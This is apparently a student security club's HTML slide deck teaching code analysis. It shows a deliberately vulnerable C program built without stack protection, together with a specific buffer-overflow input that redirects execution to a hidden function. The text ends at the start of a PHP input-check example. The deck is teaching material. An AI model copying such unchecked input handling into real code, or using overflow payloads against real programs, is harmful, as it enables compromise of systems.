2022-02-03/Presentation.html
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8"/>
<title>LUCDC: Code Analysis</title>
<meta name="author" content="(Andrew Rioux)"/>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js/dist/reveal.css"/>

<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/reveal.js/dist/theme/moon.css" id="theme"/>

<link rel="stylesheet" href="../common/theme.css"/>

<!-- If the query includes 'print-pdf', include the PDF print sheet -->

</head>
<body>
<div class="reveal">
<div class="slides">
<section id="sec-title-slide" data-background="../common/background.png"><h1>LUCDC: Code Analysis</h1>
Andrew Rioux (<a href="mailto:arioux@liberty.edu">arioux@liberty.edu</a>)
</section>

<section>
<section id="slide-orgc78a3b2" data-background="../common/background.png">
<h2 id="orgc78a3b2"><span class="section-number-2">1.</span> About me</h2>
<ul>
<li class="fragment appear">Andrew Rioux</li>
<li class="fragment appear">CS: Software Engineering (Sophomore)</li>
<li class="fragment appear">Software Engineer for US Navy</li>
<li class="fragment appear">LU CDC Vice President</li>

</ul>
</section>
</section>
<section>
<section id="slide-org49c978f" data-background="../common/background.png">
<h2 id="org49c978f"><span class="section-number-2">2.</span> Presentation information</h2>
<div class="outline-text-2" id="text-2">
</div>
</section>
<section id="slide-orga999580" data-background="../common/background.png">
<h3 id="orga999580"><span class="section-number-3">2.1.</span> Located at the following git repository</h3>
<p>
<a href="https://github.com/r-a303931/lucdc-presentations">https://github.com/r-a303931/lucdc-presentations</a>
</p>

</section>
<section id="slide-orga7379a8" data-background="../common/background.png">
<h3 id="orga7379a8"><span class="section-number-3">2.2.</span> Example 1</h3>
<ul>
<li>Build: <code>docker-compose run example1_build</code> (or <code>make</code> in <a href="./example1">./example1</a>)</li>
<li>Run: <code>docker-compose run example1</code></li>

</ul>

</section>
<section id="slide-orgb2856b9" data-background="../common/background.png">
<h3 id="orgb2856b9"><span class="section-number-3">2.3.</span> Example 2</h3>
<ul>
<li>Start web server: <code>docker-compose up example2</code></li>

</ul>

</section>
</section>
<section>
<section id="slide-org38e82ec" data-background="../common/background.png">
<h2 id="org38e82ec"><span class="section-number-2">3.</span> Life Goals</h2>
<p>
What do you plan to do after graduation?
</p>
<ul class="fragment appear">
<li>Penetration testing?</li>
<li>Security engineer?</li>
<li>Software Engineer / Programmer?</li>

</ul>

</section>
</section>
<section>
<section id="slide-org2a331d2" data-background="../common/background.png">
<h2 id="org2a331d2"><span class="section-number-2">4.</span> What are you going to deal with in your day to day job?</h2>
<p class="fragment appear">
Code!
</p>

</section>
</section>
<section>
<section id="slide-orgf7889d0" data-background="../common/background.png">
<h2 id="orgf7889d0"><span class="section-number-2">5.</span> What we will be going over here</h2>
<ul>
<li class="fragment appear">Example 1: Too simple with no safety (C)</li>
<li class="fragment appear">Example 2: Too complex with fake safety (PHP)</li>
<li class="fragment appear">What can we learn?</li>
<li class="fragment appear">Club exercise (JS)!</li>

</ul>

</section>
</section>
<section>
<section id="slide-org285b3ca" data-background="../common/background.png">
<h2 id="org285b3ca"><span class="section-number-2">6.</span> Example 1: Too simple with no safety</h2>
<div class="outline-text-2" id="text-6">
</div>
</section>
<section id="slide-org6b3e6ad" data-background="../common/background.png">
<h3 id="org6b3e6ad"><span class="section-number-3">6.1.</span> Source code:</h3>
<div class="org-src-container">

<pre  class="src src-c"   ><code trim><span style="color: #51afef; font-weight: bold;">#include</span> <span style="color: #51afef;">&lt;</span><span style="color: #98be65;">stdio.h</span><span style="color: #51afef;">&gt;</span>
<span style="color: #5B6268;">// </span><span style="color: #5B6268;">It's a surprise tool that will help us later...</span>
<span style="color: #ECBE7B;">void</span> <span style="color: #c678dd;">shell</span><span style="color: #51afef;">()</span> <span style="color: #51afef;">{</span>
    printf<span style="color: #c678dd;">(</span><span style="color: #98be65;">"Suspicious function here...\n"</span><span style="color: #c678dd;">)</span>;
<span style="color: #51afef;">}</span>
<span style="color: #ECBE7B;">void</span> <span style="color: #c678dd;">get_name</span><span style="color: #51afef;">()</span> <span style="color: #51afef;">{</span>
    printf<span style="color: #c678dd;">(</span><span style="color: #98be65;">"What is your name?\n"</span><span style="color: #c678dd;">)</span>;
    <span style="color: #ECBE7B;">char</span> <span style="color: #dcaeea;">buffer</span><span style="color: #c678dd;">[</span><span style="color: #da8548; font-weight: bold;">20</span><span style="color: #c678dd;">]</span>;
    scanf<span style="color: #c678dd;">(</span><span style="color: #98be65;">"%s"</span>, buffer<span style="color: #c678dd;">)</span>;
    printf<span style="color: #c678dd;">(</span><span style="color: #98be65;">"Hello, %s!\n"</span>, buffer<span style="color: #c678dd;">)</span>;
<span style="color: #51afef;">}</span>
<span style="color: #ECBE7B;">int</span> <span style="color: #c678dd;">main</span><span style="color: #51afef;">()</span> <span style="color: #51afef;">{</span>
    get_name<span style="color: #c678dd;">()</span>;
<span style="color: #51afef;">}</span>
</code></pre>
</div>

</section>
<section id="slide-org375c3f4" data-background="../common/background.png">
<h3 id="org375c3f4"><span class="section-number-3">6.2.</span> How is this compiled?</h3>
<div class="org-src-container">

<pre  class="src src-makefile"   ><code trim><span style="color: #51afef;">example1</span>: example1.c
    gcc -no-pie --no-stack-protector -o example1 example1.c
</code></pre>
</div>

</section>
<section id="slide-orgd4a2ee4" data-background="../common/background.png">
<h3 id="orgd4a2ee4"><span class="section-number-3">6.3.</span> Options of interest</h3>
<ul class="fragment appear">
<li><code>-no-pie</code></li>

</ul>
<ul class="fragment appear">
<li><code>--no-stack-protector</code></li>

</ul>

</section>
<section id="slide-org5360763" data-background="../common/background.png">
<h3 id="org5360763"><span class="section-number-3">6.4.</span> We know <code>shell</code> is bad</h3>
<p>
But it&rsquo;s benign&#x2026;.
</p>
<p class="fragment appear">
right?
</p>

</section>
<section id="slide-org1ce767f" data-background="../common/background.png">
<h3 id="org1ce767f"><span class="section-number-3">6.5.</span> Nope!</h3>
<p>
What if your name is <code>AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x46\x11\x40\x0\x0\x0\x0\x0</code>?
</p>

</section>
<section id="slide-org4132940" data-background="../common/background.png">
<h3 id="org4132940"><span class="section-number-3">6.6.</span> What happened?</h3>
<p class="fragment appear">
Buffer overflow exploit!
</p>

</section>
<section id="slide-org9be8b05" data-background="../common/background.png">
<h3 id="org9be8b05"><span class="section-number-3">6.7.</span> What could happen?</h3>
</section>
</section>
<section>
<section id="slide-org25ba31b" data-background="../common/background.png">
<h2 id="org25ba31b"><span class="section-number-2">7.</span> Example 2: Too complex with fake safety</h2>
<p>
PHP has some magic variable management
</p>
<p class="fragment appear">
&#x2026;can this be taken advantage of?
</p>

</section>
<section id="slide-orgc576115" data-background="../common/background.png">
<h3 id="orgc576115"><span class="section-number-3">7.1.</span> Aside: How HTTP works</h3>
<p class="fragment appear">
You make a request, and get a response
</p>

</section>
<section id="slide-org166e4da" data-background="../common/background.png">
<h4 id="org166e4da"><span class="section-number-4">7.1.1.</span> Get me a file, please!</h4>
</section>
<section id="slide-org40d03b9" data-background="../common/background.png">
<h4 id="org40d03b9"><span class="section-number-4">7.1.2.</span> Post to this location and do a thing!</h4>
</section>
<section id="slide-org6998afd" data-background="../common/background.png">
<h4 id="org6998afd"><span class="section-number-4">7.1.3.</span> How do we handle that in PHP?</h4>
<ul>
<li class="fragment appear"><code>$_GET</code></li>
<li class="fragment appear"><code>$_POST</code></li>

</ul>
</section>
<section id="slide-orga033647" data-background="../common/background.png">
<h3 id="orga033647"><span class="section-number-3">7.2.</span> Aside: PHP in 5 seconds for C++ programmers</h3>
<p class="fragment appear">
Every variable begins with <code>$</code>
</p>

<p class="fragment appear">
Every PHP file begins with <code>&lt;?php</code>
</p>

<p class="fragment appear">
No main function, everything just happens in the order it&rsquo;s displayed
</p>

<p class="fragment appear">
Other than that, basically C++!
</p>
</section>
<section id="slide-orge47ee90" data-background="../common/background.png">
<h3 id="orge47ee90"><span class="section-number-3">7.3.</span> Source code: Input check</h3>
<div class="org-src-container">

<pre  class="src src-php"   ><code trim><span style="color: #51afef; font-weight: bold;">&lt;?php</span>
    <span style="color: #51afef;">if</span> <span style="color: #51afef;">(</span><span style="color: #51afef;">empty</span><span style="color: #c678dd;">(</span>$<span style="color: #dcaeea;">_POST</span><span style="color: #98be65;">[</span><span style="color: #98be65;">'hmac'</span><span style="color: #98be65;">]</span><span style="color: #c678dd;">)</span> || <span style="color: #51afef;">empty</span><span style="color: #c678dd;">(</span>$<span style="color: #dcaeea;">_POST</span><span style="color: #98be65;">[</span><span style="color: #98be65;">'host'</span><span style="color: #98be65;">]</span><span style="color: #c678dd;">)</span><span style="color: #51afef;">)</span> <span style="color: #51afef;">{</span>
        header<span style="color: #c678dd;">(</span><span style="color: #98be65;">'HTTP/1.0 400 Bad Request'</span><span style="color: #c678dd;">)</span>;
        <span style="color: #51afef;">exit</span>;
    <span style="color: #51afef;">}</span>
</code></pre>
</div>

</section>
